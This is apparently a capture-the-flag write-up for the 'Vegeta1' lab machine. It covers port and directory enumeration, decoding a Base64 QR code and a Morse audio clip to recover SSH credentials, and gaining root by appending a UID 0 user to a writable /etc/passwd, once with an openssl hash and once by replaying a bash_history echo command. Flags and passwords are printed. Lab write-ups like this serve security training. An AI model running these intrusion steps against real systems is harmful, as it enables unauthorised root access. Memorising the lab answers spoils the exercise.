# Vegeta1

## Initial access

Run `autorecon` to enumerate open ports and services:

```
sudo autorecon 192.168.149.73
```

Open ports discovered:

- **22** — SSH (Debian 10+deb10u2, protocol 2.0)
- **80** — HTTP (Apache httpd 2.4.38, Debian)
  - Additional webpages:
    - `http://192.168.149.73/robots.txt`
    - `http://192.168.149.73/admin/`
    - `http://192.168.149.73/image/`
    - `http://192.168.149.73/img/`
    - `http://192.168.149.73/login.php`
    - `http://192.168.149.73/manual/`

Visiting the root page revealed nothing of interest. The `robots.txt` file listed two entries:

```
*
/find_me
```

The `/find_me` directory led to a page (`find_me.html`) containing a long Base64-encoded string in the HTML source:

```
aVZCT1J3MEtHZ29BQUFBTlNVaEVVZ0FBQU1nQUFBRElDQVlBQUFDdFdLNmVBQUFIaGtsRVFWUjRuTzJad1k0c09RZ0U1LzkvK3UyMU5TdTdCd3JTaVN0QzhoR2M0SXBMOTg4L0FGanljem9BZ0RNSUFyQUJRUUEySUFqQUJnUUIySUFnQUJzUUJHQURnZ0JzUUJDQURRZ0NzQUZCQURhRUJmbjUrUmwvbk9aTFAxeER6K3g5VTA1cWJoWjFkcjRzSFQyejkwMDVxYmxaMU5uNXNuVDB6TjQzNWFUbVpsRm41OHZTMFRONzM1U1RtcHRGblowdlMwZlA3SDFUVG1wdUZuVjJ2aXdkUGJQM1RUbXB1Vm5VMmZteWRQVE0zamZscE9hdVhKUVRUamxkSHZ0YmxvNDZOUWp5UjV4eUlvZ09CUGtqVGprUlJBZUMvQkdubkFpaUEwSCtpRk5PQk5HQklIL0VLU2VDNkVDUVArS1VFMEYwakJWRS9aSGM4SEhkUHZ1RWQwZVF3N003MWFtelRIaDNCRGs4dTFPZE9zdUVkMGVRdzdNNzFhbXpUSGgzQkRrOHUxT2RPc3VFZDBlUXc3TTcxYW16VEhoM0JEazh1MU9kT3N1RWQwZVFJcWJNNENUcmhKMGhTQkZUWmtDUUdBaFN4SlFaRUNRR2doUXhaUVlFaVlFZ1JVeVpBVUZpSUVnUlUyWkFrQmdJVXNTVUdSQWtCb0lVMFRHZjAxN2UrdTRJVXNScEtSRGtXYzVsdjNEQlN4ZjFqZE5TSU1pem5NdCs0WUtYTHVvYnA2VkFrR2M1bC8zQ0JTOWQxRGRPUzRFZ3ozSXUrNFVMWHJxb2I1eVdBa0dlNVZ6MkN4ZThkRkhmT0MwRmdqekx1ZXdYTGhCL2VGazZjcm84Mm9rc2IzMTNCQkgwdkNITlc5OGRRUVE5YjhqeTFuZEhFRUhQRzdLODlkMFJSTkR6aGl4dmZYY0VFZlM4SWN0YjN4MUJCRDF2eVBMV2R5OFZaTXJwV1BDYjY2YWNEQWdTbUkrNjJTY0RnZ1RtbzI3MnlZQWdnZm1vbTMweUlFaGdQdXBtbnd3SUVwaVB1dGtuQTRJRTVxTnU5c25nOVNPMkFjcmxQN212SXd2OEg3YjVDd1NCVDlqbUx4QUVQbUdidjBBUStJUnQvZ0pCNEJPMitRc0VnVS9ZNWk4UUJENlIvUS9pMURPTFU4OHBkV3FxY3lKSTBlenFubFBxMUNBSWdveXFVNE1nQ0RLcVRnMkNJTWlvT2pVSWdpQ2o2dFFnQ0lLTXFsTnpYQkExYnhZeWk5TU1UbStVeWwvZXNSZ0VpZU0wZzlNYnBmS1hkeXdHUWVJNHplRDBScW44NVIyTFFaQTRUak00dlZFcWYzbkhZaEFranRNTVRtK1V5bC9lc1JnRWllTTBnOU1icGZLWGR5d0dRZUk0emVEMFJxbjhwYzJTUTcxWkFxZlpwd2pTVWJmc2w2cEtoRU1RajV3SUVzeWZxa3FFUXhDUG5BZ1N6SitxU29SREVJK3NDQkxNbjZwS2hFTVFqNXdJRXN5ZnFrcUVReENQbkFnU3pKK3FTb1JERUkrY0NCTE1uNm9xRHVleWpLNmVhcHdFNmNpWjdabkttS29xRHVleWpLNmVhaEFFUVI3VnFYdXFRUkFFZVZTbjdxa0dRUkRrVVoyNnB4b0VRWkJIZGVxZWFoQUVRUjdWcVh1cVFaQ0JncWcvNWpmZjEvRngzUzdXOHE2cHdia1BRUkNFK3hDa01HZnFycW5CdVE5QkVJVDdFS1F3WitxdXFjRzVEMEVRaFBzUXBEQm42cTdLY0ZtY0hzYnBvM1RLMlpGbEFnaHlPQXVDZUlNZ2g3TWdpRGNJY2pnTGduaURJSWV6SUlnM0NISTRDNEo0Z3lDSHN5Q0lONldDM1A0d1RvL3RKTEo2TDhvc0NGSjBueG9FUVpDMkxCMzNxVUVRQkduTDBuR2ZHZ1JCa0xZc0hmZXBRUkFFYWN2U2NaOGFCRUdRdGl3ZDk2bEJrSUdDZE5TcGUyYnZVMzk0Nm5mb3lPazAzN0pmdU1Ba2VGZlA3SDFPSDE3MlBuVk9wL21XL2NJRkpzRzdlbWJ2Yy9yd3N2ZXBjenJOdCt3WExqQUozdFV6ZTUvVGg1ZTlUNTNUYWI1bHYzQ0JTZkN1bnRuN25ENjg3SDNxbkU3ekxmdUZDMHlDZC9YTTN1ZjA0V1h2VStkMG1tL1pMMXhnRXJ5clovWStwdzh2ZTU4NnA5Tjh5MzdoQXZHSGZzUHlPN0pNMmFkNlp3aGkrbWdkODkyd1R3UzU3RUU3WmtjUUJMbm1RVHRtUnhBRXVlWkJPMlpIRUFTNTVrRTdaa2NRQkxubVFUdG1SNUFYQ1hJNzZnKzJBN1dRSFZrNnhFcmxUMVZkRElKNFpFRVFVeERFSXd1Q21JSWdIbGtReEJRRThjaUNJS1lnaUVjV0JERUZRVHl5akJXa1kyRDFjV0xLQitUeXdYNERRUkFFUVlUM0ljaGhFS1FXQkVFUUJCSGVoeUNIUVpCYUVBUkJFRVI0SDRJY0JrRnFzUmJFaVk2Y04zek1UaCtzK28xUy9VNEg2QUpCRUFSQk5pQUlnaURJQmdSQkVBVFpnQ0FJZ2lBYkVBUkJFR1FEZ2lESUtFRnUrTGc2NW5QSzRuVFV1MTdlRlM0d2VqUjF6bzc1bkxJNEhmV3VsM2VGQzR3ZVRaMnpZejZuTEU1SHZldmxYZUVDbzBkVDUreVl6eW1MMDFIdmVubFh1TURvMGRRNU8rWnp5dUowMUx0ZTNoVXVNSG8wZGM2TytaeXlPQjMxcnBkM2hRdU1IazJkczJNK3B5eE9SNzNyNVYzaEFxTkhVK2QwMnN1VUxOTnpJb2h4M1ExWnB1ZEVFT082RzdKTXo0a2d4blUzWkptZUUwR002MjdJTWowbmdoalgzWkJsZWs0RU1hNjdJY3YwbkFoU3hKUVoxRDJuZkMvTEhKWExjQm9ZUVR4NlR2bGVsamtxbCtFME1JSjQ5Snp5dlN4elZDN0RhV0FFOGVnNTVYdFo1cWhjaHRQQUNPTFJjOHIzc3N4UnVReW5nUkhFbytlVTcyV1pvM0laVGdNamlFZlBLZC9MTWtmbE1weVk4bEVxSC9zSlRoODZnaFNBSUxVZ1NQT2kxQ0JJTFFqU3ZDZzFDRklMZ2pRdlNnMkMxSUlnell0U2d5QzFJRWp6b3RRZ1NDMElVckNvS1NjN245TmVzcHplZmNVTTJmbFMvU29EVERrZEMzYWF3U2tuZ2d3OEhRdDJtc0VwSjRJTVBCMExkcHJCS1NlQ0REd2RDM2Fhd1NrbmdndzhIUXQybXNFcEo0SU1QQjBMZHByQktlZnJCQUY0RXdnQ3NBRkJBRFlnQ01BR0JBSFlnQ0FBR3hBRVlBT0NBR3hBRUlBTkNBS3dBVUVBTmlBSXdBWUVBZGp3SHlVRnd2VnIwS3ZGQUFBQUFFbEZUa1N1UW1DQw
```

Decoding this string twice in Base64 using CyberChef revealed a PNG file containing a QR code. Scanning the QR code with an online QR reader ([QR Code Scanner](https://dnschecker.org/qr-code-scanner.php)) returned only a password — no username was provided:

```
topshellv
```

This password was tried against SSH without a matching username and yielded no access. Further enumeration of the other webpages (`/admin/`, `/image/`, `/img/`, `/login.php`, `/manual/`) yielded no useful information.

A second directory busting pass with a larger wordlist was performed:

```
feroxbuster -u http://192.168.149.73/ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt -n
```

This revealed an additional directory: `http://192.168.149.73/bulma`. Inside was a file named `hahahaha.wav`, which contained an audio recording of Morse code. Decoding the audio at an online Morse code decoder ([Morse Express](https://morsexpress.com/morse-code-audio-decoder/)) revealed:

```
USER : TRUNKS PASSWORD : US3R(S IN DOLLARS SYMBOL)
```

This translated to the credentials `trunks:u$3r`.

Logged in via SSH:

```
ssh trunks@192.168.149.73
trunks@192.168.149.73's password: u$3r

trunks@lab-pg-10-debian10-vegeta-242-099:~$ whoami
trunks
```

Retrieved the local flag:

```
trunks@lab-pg-10-debian10-vegeta-242-099:~$ cat local.txt
227d6352c69317f27c7ce71dfe776f5c
```

## Privilege escalation

Uploaded `linpeas.sh` to the target via SCP:

```
scp linpeas.sh trunks@192.168.149.73:/tmp
trunks@192.168.149.73's password: u$3r
```

Ran `linpeas.sh` from `/tmp` to enumerate privilege escalation vectors. The tool reported that `/etc/passwd` is writable. (Note: `copyfail` and `DirtyFrag` did not work.) Confirming the file permissions:

```
trunks@lab-pg-10-debian10-vegeta-242-099:/tmp$ ls -al /etc/passwd
-rw-r--r-- 1 trunks root 1535 Oct 31 10:06 /etc/passwd
```

The file was owned by user `trunks` instead of the usual `root`, allowing `trunks` to write to it as the file owner. A root-level user entry was generated using `openssl`:

```
openssl passwd -1 pwned
$1$W5oqM9mz$BCV2EHVWv0lkPntvH8PXz/
```

This hash was appended to `/etc/passwd` as a new root user entry:

```
trunks@lab-pg-10-debian10-vegeta-242-099:/tmp$ nano /etc/passwd
pwned:$1$W5oqM9mz$BCV2EHVWv0lkPntvH8PXz/:0:0:root:/root:/bin/bash
```

Switched to the newly created user to obtain a root shell:

```
trunks@lab-pg-10-debian10-vegeta-242-099:/tmp$ su pwned
Password: pwned

root@lab-pg-10-debian10-vegeta-242-099:/tmp# whoami
root
```

Retrieved the proof flag:

```
root@lab-pg-10-debian10-vegeta-242-099:/tmp# cd /root
root@lab-pg-10-debian10-vegeta-242-099:~# cat proof.txt
44ca5c8a2e1f43f68ccf583a5edd1bf9
```

### Alternative Privilege Escalation — replaying .bash_history

The user `trunks`'s `.bash_history` file contains the exact commands previously used to add a root-level user named `Tom`. The entry has since been removed from `/etc/passwd` (likely cleaned up after the fact), but the history still preserves the `perl` command that generated the password hash and the `echo` command that wrote the entry:

```
trunks@lab-pg-10-debian10-vegeta-242-099:~$ cat .bash_history
perl -le 'print crypt("Password@973","addedsalt")'
echo "Tom:ad7t5uIalqMws:0:0:User_like_root:/root:/bin/bash" >> /etc/passwd
su Tom
```

The hash `ad7t5uIalqMws` was generated using `perl` with the password `Password@973`. Replaying the `echo` command re-adds the `Tom` entry with UID/GID 0:

```
trunks@lab-pg-10-debian10-vegeta-242-099:~$ echo "Tom:ad7t5uIalqMws:0:0:User_like_root:/root:/bin/bash" >> /etc/passwd
```

Switch to the `Tom` account:

```
trunks@lab-pg-10-debian10-vegeta-242-099:~$ su Tom
Password: Password@973

root@lab-pg-10-debian10-vegeta-242-099:/home/trunks# whoami
root
```

Credit: [Joshua — Vegeta1 Writeup](https://hackindex.io/writeups/vegeta1)
